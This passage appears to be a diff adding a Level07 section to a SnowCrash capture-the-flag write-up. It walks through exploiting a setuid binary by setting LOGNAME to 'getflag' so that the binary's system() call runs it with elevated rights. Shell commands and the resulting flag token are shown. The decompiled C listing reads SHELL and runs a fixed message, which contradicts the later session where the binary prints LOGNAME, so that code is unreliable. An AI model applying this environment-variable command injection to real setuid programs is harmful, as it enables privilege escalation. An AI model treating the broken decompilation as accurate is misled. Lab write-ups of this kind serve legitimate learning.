@@ -435,3 +435,59 @@ And we got the flag !
 ```
 wiok45aaoguiboiki2tuin6ub
 ```
+
+### Level07
+
+We have a binary file.
+Executing the binary file we get :
+```
+./level07
+level07
+```
+
+The binary is owned by flag07 and has the `s` permission, so similar as before, the goal is to execute the getflag command as flag07 to get the flag.
+
+Decompiling the binary with Ghidra we get :
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main() {
+    gid_t egid = getegid();
+    uid_t euid = geteuid();
+
+    setresgid(egid, egid, egid);
+    setresuid(euid, euid, euid);
+
+    char *env_var = getenv("SHELL");
+    char *cmd;
+    asprintf(&cmd, "%s %s", env_var, "Permission denied, please try again.");
+
+    system(cmd);
+
+    free(cmd);
+    return 0;
+}
+```
+We know we cannot trust Ghidra 100% so we also use GDB to get more informations. We can find trace of the functions `getenv` and `system`.
+
+We can deduce the binary prints something from the environment.
+We can try exporting a variable into the environment to get the flag we want.
+
+Trying exporting a variable we get :
+```
+level07@SnowCrash:~$ export LOGNAME=try
+level07@SnowCrash:~$ ./level07
+try
+```
+
+So we now know with env variable is printed by the binary :
+```
+ level07@SnowCrash:~$ export LOGNAME="getflag"
+level07@SnowCrash:~$ ./level07
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+```
+
+### Level08
+
